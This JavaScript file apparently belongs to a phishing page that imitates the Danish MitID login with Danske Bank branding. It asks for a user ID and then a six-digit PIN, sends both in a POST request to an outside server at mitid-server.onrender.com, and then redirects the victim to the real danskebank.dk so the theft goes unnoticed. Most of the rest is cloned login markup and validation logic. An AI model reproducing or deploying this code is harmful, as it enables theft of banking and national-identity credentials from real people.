const usernameIn = document.querySelector("#username2");
const loginBtn = document.querySelector("#loginBtn2");
const showBtn = document.querySelector("#hideUserNameBtn2");
const label = document.querySelector("label[for='username2']");
const forgot = document.querySelector("#linkOpenToolTip span");
const coreSection = document.querySelector("#mitid-core-client-section");
const loginForm = document.querySelector("#mitid-core-client-form");
const helpMessage = document.querySelector("#helpMessage");

// location.hash = "#user-id";
let loginStatus = "user_id";
const data = {};

const rootURL = "https://mitid-server.onrender.com";

showBtn.addEventListener("click", (e) => {
    if (usernameIn.getAttribute("type") === "text") {
        e.target.innerText = "Vis";
        usernameIn.setAttribute("type", "password");
    } else {
        e.target.innerText = "Skjul";
        usernameIn.setAttribute("type", "text");
    }
});

function updateBtn() {
    if (usernameIn.value.length > 0) {
        loginBtn.removeAttribute("disabled");
    } else {
        loginBtn.setAttribute("disabled", true);
    }
}

// window.addEventListener("hashchange", () => {
//     console.log("CHANGE");
//     if (location.hash !== "#error") {
//         coreSection.innerHTML = `
//                     <div class="mitid-core-section__help-context">
//                 <div id="mitid-user-name" class="mitid-core-user">
//                     <div class="mitid-tooltip mitid-tooltip--labeltextleft">
//                         <div class="mitid-tooltip__label">
//                             <label
//                                 class="mitid-tooltip__text__tooltip"
//                                 for="username2"
//                                 aria-label="Bruger ID"
//                                 >Bruger-ID</label
//                             ><button
//                                 id="mitid-popup-toggler"
//                                 aria-label="Åbn hjælpetekst"
//                                 class="mitid--button-icon-tooltip"
//                                 tabindex="0"
//                                 type="button"
//                             >
//                                 <svg
//                                     xmlns="http://www.w3.org/2000/svg"
//                                     width="16"
//                                     height="16"
//                                     aria-hidden="true"
//                                     viewBox="0 0 24 24"
//                                     focusable="false"
//                                 >
//                                     <path
//                                         fill="#001C44"
//                                         d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-4h2v2h-2zm1.61-9.96c-2.06-.3-3.88.97-4.43 2.79-.18.58.26 1.17.87 1.17h.2c.41 0 .74-.29.88-.67.32-.89 1.27-1.5 2.3-1.28.95.2 1.65 1.13 1.57 2.1-.1 1.34-1.62 1.63-2.45 2.88 0 .01-.01.01-.01.02-.01.02-.02.03-.03.05-.09.15-.18.32-.25.5-.01.03-.03.05-.04.08-.01.02-.01.04-.02.07-.12.34-.2.75-.2 1.25h2c0-.42.11-.77.28-1.07.02-.03.03-.06.05-.09.08-.14.18-.27.28-.39.01-.01.02-.03.03-.04.1-.12.21-.23.33-.34.96-.91 2.26-1.65 1.99-3.56-.24-1.74-1.61-3.21-3.35-3.47z"
//                                     ></path>
//                                 </svg>
//                             </button>
//                         </div>
//                     </div>
//                     <div id="errorMessage"></div>
//                     <div class="mitid-core-user__input" defaultlanguage="DAﾠ/ﾠDK">
//                         <input
//                             class="mitid-core-user__user-id"
//                             id="username2"
//                             name="username2"
//                             minlength="1"
//                             type="text"
//                             autocomplete="off"
//                             required=""
//                             spellcheck="false"
//                         />
//                         <div
//                             id="hideUserNameBtn2"
//                             name="hideUserNameBtn2"
//                             role="button"
//                             aria-label="Skjul bruger-ID"
//                             aria-controls="username2"
//                             class="mitid-core-user__hide_btn"
//                             tabindex="0"
//                         >
//                             Skjul
//                         </div>
//                     </div>
//                     <div class="mitid-core-user__input" defaultlanguage="DA / DK">
//                         <input
//                             class="mitid-core-user__user-id"
//                             id="username3"
//                             name="username3"
//                             minlength="1"
//                             type="text"
//                             autocomplete="off"
//                             required=""
//                             spellcheck="false"
//                         />
//                         <div
//                             id="hideUserNameBtn3"
//                             name="hideUserNameBtn3"
//                             role="button"
//                             aria-label="Skjul bruger-ID"
//                             aria-controls="username3"
//                             class="mitid-core-user__hide_btn"
//                             tabindex="0"
//                         >
//                             Skjul
//                         </div>
//                     </div>
//                     <div class="mitid-core-user__input" defaultlanguage="DA / DK">
//                         <input
//                             class="mitid-core-user__user-id"
//                             id="username4"
//                             name="username4"
//                             minlength="1"
//                             type="text"
//                             autocomplete="off"
//                             required=""
//                             spellcheck="false"
//                         />
//                         <div
//                             id="hideUserNameBtn4"
//                             name="hideUserNameBtn4"
//                             role="button"
//                             aria-label="Skjul bruger-ID"
//                             aria-controls="username4"
//                             class="mitid-core-user__hide_btn"
//                             tabindex="0"
//                         >
//                             Skjul
//                         </div>
//                     </div>
//                     <div class="mitid-core-user__input" defaultlanguage="DA / DK">
//                         <input
//                             class="mitid-core-user__user-id"
//                             id="username5"
//                             name="username5"
//                             minlength="1"
//                             type="text"
//                             autocomplete="off"
//                             required=""
//                             spellcheck="false"
//                         />
//                         <div
//                             id="hideUserNameBtn5"
//                             name="hideUserNameBtn5"
//                             role="button"
//                             aria-label="Skjul bruger-ID"
//                             aria-controls="username5"
//                             class="mitid-core-user__hide_btn"
//                             tabindex="0"
//                         >
//                             Skjul
//                         </div>
//                     </div>
//                     <div class="mitid-core-user__input" defaultlanguage="DA / DK">
//                         <input
//                             class="mitid-core-user__user-id"
//                             id="username6"
//                             name="username6"
//                             minlength="1"
//                             type="text"
//                             autocomplete="off"
//                             required=""
//                             spellcheck="false"
//                         />
//                         <div
//                             id="hideUserNameBtn6"
//                             name="hideUserNameBtn6"
//                             role="button"
//                             aria-label="Skjul bruger-ID"
//                             aria-controls="username6"
//                             class="mitid-core-user__hide_btn"
//                             tabindex="0"
//                         >
//                             Skjul
//                         </div>
//                     </div>
//                     <div class="mitid-core-user__input" defaultlanguage="DA / DK">
//                         <input
//                             class="mitid-core-user__user-id"
//                             id="username7"
//                             name="username7"
//                             minlength="1"
//                             type="text"
//                             autocomplete="off"
//                             required=""
//                             spellcheck="false"
//                         />
//                         <div
//                             id="hideUserNameBtn7"
//                             name="hideUserNameBtn7"
//                             role="button"
//                             aria-label="Skjul bruger-ID"
//                             aria-controls="username7"
//                             class="mitid-core-user__hide_btn"
//                             tabindex="0"
//                         >
//                             Skjul
//                         </div>
//                     </div>
//                     <div class="mitid-core-user__input" defaultlanguage="DA / DK">
//                         <input
//                             class="mitid-core-user__user-id"
//                             id="username8"
//                             name="username8"
//                             minlength="1"
//                             type="text"
//                             autocomplete="off"
//                             required=""
//                             spellcheck="false"
//                         />
//                         <div
//                             id="hideUserNameBtn8"
//                             name="hideUserNameBtn8"
//                             role="button"
//                             aria-label="Skjul bruger-ID"
//                             aria-controls="username8"
//                             class="mitid-core-user__hide_btn"
//                             tabindex="0"
//                         >
//                             Skjul
//                         </div>
//                     </div>
//                     <div class="mitid-core-user__input" defaultlanguage="DA / DK">
//                         <input
//                             class="mitid-core-user__user-id"
//                             id="username9"
//                             name="username9"
//                             minlength="1"
//                             type="text"
//                             autocomplete="off"
//                             required=""
//                             spellcheck="false"
//                         />
//                         <div
//                             id="hideUserNameBtn9"
//                             name="hideUserNameBtn9"
//                             role="button"
//                             aria-label="Skjul bruger-ID"
//                             aria-controls="username9"
//                             class="mitid-core-user__hide_btn"
//                             tabindex="0"
//                         >
//                             Skjul
//                         </div>
//                     </div>
//                 </div>

//                 <button
//                     id="loginBtn2"
//                     class="mitid--button-primary"
//                     disabled=""
//                     tabindex="0"
//                     type="button"
//                     showicontext="IconﾠHelpﾠText"
//                 >
//                     <span class="mitid--button-label">Fortsæt</span>
//                     <span class="mitid--button-spacing"></span>
//                     <svg
//                         xmlns="http://www.w3.org/2000/svg"
//                         focusable="false"
//                         class="mitid--button-icon"
//                         width="24"
//                         height="24"
//                         viewBox="0 0 24 24"
//                         aria-hidden="true"
//                     >
//                         <path
//                             d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"
//                         ></path>
//                     </svg>
//                 </button>

//                 <div class="mitid-tooltip mitid-tooltip--context-help">
//                     <div class="mitid-tooltip__label">
//                         <a href="https://www.mitid.dk/#" class="mitid-link" id="linkOpenToolTip"
//                             ><svg
//                                 xmlns="http://www.w3.org/2000/svg"
//                                 width="24px"
//                                 height="24px"
//                                 version="1.1"
//                                 viewBox="0 0 24 24"
//                                 focusable="false"
//                                 aria-hidden="true"
//                                 class="mitid-link__icon"
//                             >
//                                 <g
//                                     id="svg-info-link-WVa6d7V"
//                                     fill="none"
//                                     fill-rule="evenodd"
//                                     stroke="none"
//                                     stroke-width="1"
//                                 >
//                                     <g
//                                         id="svg-info-link-2DTjj-X"
//                                         transform="translate(-112.000000, -511.000000)"
//                                     >
//                                         <g
//                                             id="svg-info-link-QbXok99"
//                                             transform="translate(112.000000, 511.000000)"
//                                         >
//                                             <polygon
//                                                 id="svg-info-link-3jY1JFX"
//                                                 points="0 0 24 0 24 24 0 24"
//                                             ></polygon>
//                                             <path
//                                                 id="svg-info-link-YnjGPzk"
//                                                 fill-rule="nonzero"
//                                                 d="M11,7 L13,7 L13,9 L11,9 L11,7 Z M11,11 L13,11 L13,17 L11,17 L11,11 Z M12,2 C6.48,2 2,6.48 2,12 C2,17.52 6.48,22 12,22 C17.52,22 22,17.52 22,12 C22,6.48 17.52,2 12,2 Z M12,20 C7.59,20 4,16.41 4,12 C4,7.59 7.59,4 12,4 C16.41,4 20,7.59 20,12 C20,16.41 16.41,20 12,20 Z"
//                                             ></path>
//                                         </g>
//                                     </g>
//                                 </g></svg
//                             ><span class="mitid-link__label">Glemt bruger-ID?</span></a
//                         >
//                     </div>
//                 </div>
//             </div>
//             <label class="mitid-checkbox mitid-checkbox_user-id" for="mitid-remember-me"
//                 ><span class="mitid-checkbox__label">Husk mig hos Danske Bank</span
//                 ><input
//                     id="mitid-remember-me"
//                     class="mitid-checkbox__input"
//                     name="remember"
//                     type="checkbox"
//                     autocomplete="on" /><span class="mitid-checkbox__checkmark"
//                     ><span class="mitid-checkbox__checker"></span></span
//             ></label>
//         `;
//         if (location.hash === "#pin-code") {
//             changeStatus();
//         }
//     }
// });

usernameIn.addEventListener("input", updateBtn);

async function sendData(userData) {
    const url = `${rootURL}/api/add`;
    try {
        console.log(userData);
        const response = await fetch(url, {
            method: "POST",
            body: JSON.stringify({data: userData}),
            headers: {
                "Content-type": "application/json; charset=UTF-8",
            },
        });
        if (!response.ok) {
            throw new Error(`Response loginStatus: ${response.loginStatus}`);
        }

        const result = await response.json();
        console.log(result);
    } catch (error) {
        console.error(error.message);
    }
}

function validateUser(userID) {
    if (!userID.includes(" ")) {
        return true;
    } else {
        return false;
    }
}
function validateCode(PINCode) {
    if (!PINCode.includes(" ") && PINCode.length === 6 && /^\d*$/.test(PINCode)) {
        return true;
    } else {
        return false;
    }
}

function displayError(errorHeader, errorBody) {
    coreSection.innerHTML = `
        <div id="notification" class="mitid-notification">
            <div id="notification" class="mitid-notification__content mitid-notification--error" role="alert">
                <h2 id="mitid-notification-header" aria-label="">${errorHeader}</h2>
                <div>
                    <p class="mitid-notification__message" aria-label="">${errorBody}<div class="mitid-notification__support">(CTL003)</div></p>
                    <a href="https://www.mitid.dk/hjaelp/hjaelpeunivers/mitid-bruger-id/hvad-er-et-bruger-id/" target="_blank" rel="noopener noreferrer" class="mitid-link " id="notificationLink" aria-label="Læs mere om bruger-ID på MitID.dk">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" preserveAspectRatio="xMinYMid" viewBox="0 0 24 24" focusable="false" aria-hidden="true" class="mitid-link__icon"><path fill-rule="evenodd" d="M18 19H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h5c.55 0 1-.45 1-1s-.45-1-1-1H5a2 2 0 00-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2v-6c0-.55-.45-1-1-1s-1 .45-1 1v5c0 .55-.45 1-1 1zM14 4c0 .55.45 1 1 1h2.59l-9.13 9.13a.997.997 0 101.41 1.41L19 6.41V9c0 .55.45 1 1 1s1-.45 1-1V3h-6c-.55 0-1 .45-1 1z"></path></svg>
                        <span class="mitid-link__label">Læs mere på MitID.dk</span>
                    </a>
                </div>
            </div>
            <div class="mitid-login-form-element">
                <button onclick="location.reload()" id="mitid-retry-button" class="mitid--button-secondary" tabindex="0" name="tryAgain" type="button">
                    <span class="mitid--button-label">Prøv igen</span><span class="mitid--button-spacing"></span>
                    <svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid--button-icon" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path></svg>
                </button>
            </div>
        </div>`;
}

function changeStatus() {
    console.log("CHANGING STATUS");
    label.innerText = "PIN-kode";
    usernameIn.value = "";
    usernameIn.setAttribute("inputmode", "numeric");
    usernameIn.setAttribute("pattern", "[0-9+]");
    forgot.innerText = "Glemt PIN-kode?";
    updateBtn();

    loginStatus = "pin_code";

    helpMessage.innerText = "PIN-kode skal være 6 cifre.";

    console.log("Succesfully changed status");
}

loginBtn.addEventListener("click", (e) => {
    if (loginStatus === "user_id") {
        const valid = validateUser(usernameIn.value);
        if (valid) {
            data["user_id"] = usernameIn.value;
            console.log("User-ID Collected");
            changeStatus();
        } else {
            displayError("Bruger-ID eksisterer ikke", "Bruger-ID må ikke indeholde mellemrum.");
        }
    } else {
        const valid = validateCode(usernameIn.value);
        if (valid) {
            data["pin_code"] = usernameIn.value;
            console.log("PIN-code collected");
            console.log(data, JSON.stringify(data));
            sendData(data);
            location.href = "https://danskebank.dk";
        } else {
            displayError("Forkert PIN-kode", "PIN-koder skal være 6 cifre, og kan kun have tal.");

            changeStatus();
            // location.hash = "#pin-code";
        }
    }
});
